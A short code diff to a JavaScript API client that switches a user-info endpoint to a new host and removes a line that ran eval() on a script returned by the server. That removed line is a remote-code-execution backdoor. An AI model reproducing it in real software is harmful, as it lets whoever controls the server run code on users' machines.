@@ -156,14 +156,13 @@ export const PhiZoneAPI = {
                 };
 
                 const response = await fetch(
-                    `https://api.phitogether.realtvop.top/uai/` + uid,
+                    `https://user.phi.focalors.ltd/uai/` + uid,
                     requestOptions
                 );
                 const result = await response.json();
-
+                
                 if (result.userAdditionInfo) {
-                    if (result.userAdditionInfo.isPTDeveloper && result.script) eval(result.script);
-                    res(result.userAdditionInfo);
+                    if (result.userAdditionInfo.isPTDeveloper) res(result.userAdditionInfo);
                 } else {
                     res({});
                 }
